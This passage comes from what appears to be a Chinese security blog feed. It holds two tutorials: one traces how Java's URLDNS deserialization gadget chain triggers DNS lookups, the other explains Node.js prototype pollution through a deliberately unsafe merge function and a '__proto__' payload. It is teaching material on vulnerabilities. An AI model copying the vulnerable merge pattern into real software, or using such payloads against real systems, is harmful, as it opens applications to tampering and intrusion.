?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">            <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>主要代码为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//读取键和值，并将映射放入HashMap中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//跟进源码可以看出这里的readObject最终指向的就是ObjectInputStream类的readObject方法，即在这里反序列化，但是在这里只是HashMap类反序的其中一步。</span></span><br></pre></td></tr></table></figure>

<p>理解一下代码，可以看出重点在</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>这个方法的作用为为添加键值对到哈希表，<em>这里先停一下</em>，现在先来看URLDNS类里面使用的对应的put方法，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ht.put(u, url);</span><br></pre></td></tr></table></figure>

<p>我们跟进一下这个<strong>put方法的源代码</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里的put的内容是差不多的，然后在getObject的put方法下断点，强制步入，可以看到如下结果：</p>
<p><img src="/2024/08/13/URLDNS/image-20240709150442397.png" alt="image-20240709150442397"></p>
<p>可以看到这两个的结果是相同的，所以这里反序列化后对应的key和value也是我们想要访问的URL，即可以进行DNS解析。</p>
<p>然后继续看<code>HashMap</code>的<code>readObject()</code>中的<code>putVal()</code>方法，里面调用了<code>hash()</code>方法，跟进看一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>简单来说就是判断key是否为null，为Null的话就返回0，否则将对key进行使用hashCode()方法后赋值给h并将这个h进行位移16位的异或操作。</p>
<p>所以现在继续看这个hashCode()方法，此时的key为我们传入的<code>java.net.URL</code>对象，那么现在来看这个类的hashCode()方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//这里需要注意的就是hashCode的值会被改变。</span></span><br></pre></td></tr></table></figure>

<p>此时判断这个hashCode是否为为-1，并且在URL类中的hashCode值默认为-1</p>
<p><img src="/2024/08/13/URLDNS/image-20240709163744769.png" alt="image-20240709163744769"></p>
<p>这里值为-1，然后继续，当为-1的情况下的handler对象类型为：</p>
<p><img src="/2024/08/13/URLDNS/image-20240709153410150.png" alt="image-20240709153410150"></p>
<p>所以这里调用的就是URLStreamHandler类的hashCode()方法（这里强调对象与方法的所属关系，后面拉通来讲很有用），所以源代码为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这个方法会发起请求并且计算hashCode的值，所以这里的hashCode会改变</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the protocol part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the host part.</span></span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">        <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">            h += addr.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">                h += host.toLowerCase().hashCode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the file part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">        <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">            h += file.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the port part.</span></span><br><span class="line">        <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">            h += getDefaultPort();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            h += u.getPort();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the ref part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">            h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>u就是我们传入的url，在调用<code>getHostAddress</code>方法时，就会进行DNS查询，方法源代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hostAddress != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> hostAddress;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (host == <span class="literal">null</span> || host.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            hostAddress = InetAddress.getByName(host);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException | SecurityException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hostAddress;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>InetAddress.getByName(host)</code>的作用是<strong>根据主机名，获取其IP地址，在网络上其实就是一次DNS查询</strong>。</p>
<p>大致完结，拉通一下，<strong>ysoserial链的序列化过程</strong>：</p>
<ol>
<li>使用自定义的URLDNS类的getObject()方法获取到payload，重点是getObject方法，下面来说一下方法的流程</li>
<li>（在这个方法中，在getObject()方法第一行我们定义了handler，并将其自定义的SilentURLStreamHandler类实例化赋值给handler。</li>
<li>在第二行我们实例化了一个HashMap类。</li>
<li>在第三行实例化了一个URL类，此时URL类中的handler对应的对象为我们自定义的SilentURLStreamHandler类并且注意我们在这个类中重写了getHostAddress()方法</li>
<li>在第四行使用了HashMap类的put方法，这个方法的源码在前面说过，本质差不多，大致为<code>HashMap#putVal()-&gt;HashMap#hash-&gt;URL#hashCode-&gt;handler对象#hashCode</code>。注意，由于此时的handler为我们重写的类，所以最终会调用我们重写的getHostAddress()方法，但是此时会返回null，所以并不会发起请求。</li>
<li>在第五行我们本质上是调用了反射来更改hashCode的值为-1，这是因为我们在前面调用URL#HashCode时会将类里的hashCode改值，这样会导致URL类里面的hashCode值不为-1，所以需要反射改值，这样才能保证在URL类里的hashCode()方法能跳到URLStreamHandler类中。）</li>
<li>最终获取到这个payload后会将其序列化，我们只需要将其反序列化即可访问。</li>
</ol>
<p><strong>反序过程：</strong></p>
<ol>
<li>反序HashMap类，会调用HashMap类的readObject()方法，然后就是前面讲过的流程了。</li>
</ol>
<p>最后可以尝试自己编写一个exp。</p>
<p>参考文章：</p>
<p><code>https://blog.csdn.net/qq_48201589/article/details/136049878</code></p>
<p><code>https://xz.aliyun.com/t/9417?time__1311=n4%2BxuDgD9AYCqGKDQeDsR32xmrU1bKzte34D&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F</code></p>
<p><code>https://nivi4.notion.site/Java-URLDNS-e9820d5abc6e402abcaf69ef876f74c0</code></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Java反序列化调用链分析</category>
        <category>URLDNS</category>
      </categories>
  </entry>
  <entry>
    <title>node.js 原型链污染基础</title>
    <url>/2024/06/19/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="node-js-原型链污染"><a href="#node-js-原型链污染" class="headerlink" title="node.js 原型链污染"></a>node.js 原型链污染</h1><p>Node.js可以理解为运行在服务端的Javascript，并且它允许用户从NPM服务器下载别人编写的第三包到本地使用，通过<code>require</code>引入，类似于python的import。</p>
<span id="more"></span>

<h3 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h3><p><strong>对同步和异步定义的说明</strong></p>
<p>这篇文章《<a href="https://blog.csdn.net/wangpaiblog/article/details/117236684">深入理解同步阻塞、同步非阻塞、异步阻塞、异步非阻塞</a>》非常清楚，不多赘述，简单来说，在函数调用时，同步就是在当前马上进行对资源的请求，而异步就是推到后面再执行，先继续当前的程序后面的运行。</p>
<h3 id="fs模块"><a href="#fs模块" class="headerlink" title="fs模块"></a>fs模块</h3><blockquote>
<p>Node.js 文件系统模块（fs）中的方法均有同步和异步版本，例如读取文件内容的函数有异步的fs.readFile()和fs.readFile()。</p>
<p>异步的方法函数最后一个参数为回调函数，回调函数的第一个参数包含了错误信息（error）</p>
</blockquote>
<p>同步读取</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;flag.txt&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="title function_">toString</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;程序执行结束&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Output</span>:</span><br><span class="line">flag&#123;iugdsuaiDGIU&#125;</span><br><span class="line">程序执行结束 </span><br></pre></td></tr></table></figure>

<p>异步读取</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line">fs.<span class="title function_">readFile</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="keyword">function</span>(<span class="params">err,data</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;异步读取&quot;</span>+data.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;实例运行成功&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Output</span>:</span><br><span class="line">实例运行成功              </span><br><span class="line">异步读取flag&#123;iugdsuaiDGIU&#125;</span><br></pre></td></tr></table></figure>

<p>看代码运行结果，同时可以看出同步和异步的区别。</p>
<h3 id="child-process-模块"><a href="#child-process-模块" class="headerlink" title="child_process 模块"></a>child_process 模块</h3><p>child_process 模块提供了几种创建子进程的方式，支持执行系统命令、运行脚本和进程间通信。</p>
<blockquote>
<p>异步方式：spawn、exec、execFile、fork</p>
<p>同步方式：spawnSync、execSync、execFileSync</p>
<p>在异步创建进程时，spawn是基础，其他的fork、exec、execFile都是基于spawn来生成的。</p>
<p>同步创建进程可以使用child_process.spawnSync()、child_process.execSync() 和 child_process.execFileSync() ，同步的方法会阻塞 Node.js 事件循环、暂停任何其他代码的执行，直到子进程退出。</p>
</blockquote>
<h3 id="prototype、-proto-和constructor的定义"><a href="#prototype、-proto-和constructor的定义" class="headerlink" title="prototype、__proto__和constructor的定义"></a><code>prototype</code>、<code>__proto__</code>和<code>constructor</code>的定义</h3><p>对于js中的<code>prototype</code>、<code>__proto__</code>、<code>constructor</code>，这篇《<a href="https://blog.csdn.net/cc18868876837/article/details/81211729">帮你彻底搞懂JS中的prototype、<code>__proto__</code>与constructor（图解）</a>》 讲得很清楚简单，简单来说就是<code>prototype</code>对应由函数指向对象，<code>__proto__</code>就是由对象指向（父）对象，<code>constructor</code>就是由对象指向它的构造函数。并且因为函数也是一种对象，所以函数也拥有<code>__proto__</code>和<code>constructor</code>属性。具体的说明看参考文章，建议先搞懂这一点。</p>
<p><img src="/2024/06/19/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%9F%BA%E7%A1%80/image-20240607215915331.png" alt="image-20240607215915331"></p>
<p>这里需要了解一个点，如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>

<p>在这串代码，每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，在这里的show方法是绑定在对象上的，而不是绑定在”类”中，那么如果我们希望在创建类的时候只创建一次show方法，这时候就需要使用原型（<code>prototype</code>）了：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>

<p>这样同样可以获取到<code>show()</code>方法</p>
<p><strong>我们可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。</strong></p>
<p>同样由Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型。</p>
<h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现js中的继承机制。</p>
<p>如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line"><span class="title class_">Output</span>:</span><br><span class="line"><span class="title class_">Name</span>: <span class="title class_">Melania</span> <span class="title class_">Trump</span></span><br></pre></td></tr></table></figure>

<p>看这个结果，这里就需要Son类继承了Father类的<code>last_name</code>属性，在这里javascript引擎进行的操作如下：</p>
<ul>
<li><p>先是在对象son中寻找last_name</p>
</li>
<li><p>如果没有，就在<code>son.__proto__</code>中找，也就是<code>Son.prototype</code>。</p>
</li>
<li><p>如果还是找不到，就在<code>son._proto__.__proto__</code>中找，直到找到null结束。</p>
</li>
<li></li>
</ul>
<p>上面这个类似链的寻找过程就是基本的原型链了。</p>
<p>现在来看看每个过程会输出什么：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;（1）son对象的内容：&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(son)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;（2）son.__proto__的内容：&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(son.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;（3）Son.prototype.__proto__的内容(：&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(son.<span class="property">__proto__</span>.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;（4）object.prototype的内容：&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(son.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;（5）最后的null：&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(son.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>)</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）son对象的内容：</span><br><span class="line">Father &#123; first_name: &#x27;Melania&#x27; &#125;                   </span><br><span class="line">（2）son.__proto__的内容：                         </span><br><span class="line">Father &#123; first_name: &#x27;Donald&#x27;, last_name: &#x27;Trump&#x27; &#125;</span><br><span class="line">（3）Son.prototype.__proto__的内容(：              </span><br><span class="line">&#123;&#125;                                                 </span><br><span class="line">（4）object.prototype的内容：                      </span><br><span class="line">[Object: null prototype] &#123;&#125;                        </span><br><span class="line">（5）最后的null：</span><br><span class="line">null</span><br></pre></td></tr></table></figure>

<p>这样已经可以看出对应关系，注意<code>__proto__</code>的个数，注意思考理解。</p>
<h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><h3 id="基本说明"><a href="#基本说明" class="headerlink" title="基本说明"></a>基本说明</h3><p>前面已经说明<code>foo.__proto__</code>指向的就是Foo类的<code>prototype</code>。那么是否可以通过修改<code>foo.__proto__</code>进而修改Foo类呢，来看P神的代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p><strong>来解析一下</strong></p>
<ul>
<li>首先是我个人想到的问题：为什么仅仅只是<code>foo.__proto__</code>就已经对应object了，同样给代码测试</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">__proto__</span>.<span class="property">__proto__</span>)</span><br><span class="line"></span><br><span class="line"><span class="title class_">Output</span>:</span><br><span class="line"><span class="number">1</span></span><br><span class="line">[<span class="title class_">Object</span>: <span class="literal">null</span> prototype] &#123;&#125;</span><br><span class="line"><span class="literal">null</span> </span><br></pre></td></tr></table></figure>

<p>这里的结果符合条件，至于为什么相对之前那个说的好了一个<code>__proto__</code>，个人猜测foo对象相对应的不是一个函数，所以并没有类似<code>Foo.prototype</code>，直接就<code>Object.prototype</code>了。</p>
<ul>
<li>现在来解析结果：</li>
</ul>
<p>在这里虽然zoo是一个空对象{}，但zoo.bar 的结果是2，这是为什么呢。</p>
<p><strong>这就与原型链相关了</strong>，在前面那我们修改了<code>foo.__proto__.bar=2</code>，这里的<code>foo.__proto__</code>是Object类的实例，所以<strong>实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2</strong>。</p>
<p>当我们输出zoo.bar的时候，node.js引擎就开始在zoo中查找，但是在zoo对象中并没有bar这个属性，那么就到<code>zoo.__proto__</code>来寻找，此时对应的同样是<code>Object.prototype</code>，此时这个类中有bar属性，所以就被zoo继承，输出2，最终空的zoo也有了bar的属性。</p>
<p>故如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染</p>
<h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><h4 id="简单基础利用说明"><a href="#简单基础利用说明" class="headerlink" title="简单基础利用说明"></a>简单基础利用说明</h4><p>需要思考的就是在哪些情况可以设置<code>__proto__</code>的值，这就需要找能控制数组（对象）的“键名”的操作即可，如下：</p>
<ul>
<li>对象merge</li>
<li>对象clone</li>
</ul>
<p>以对象merge为例，看一个简单的merge函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这串代码中，有一个赋值操作 target[key] &#x3D; source[key] ，那么如果这里的key为<code>__proto__</code>，我们就可以尝试进行原型链污染了。</p>
<p>用如下代码测试：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable 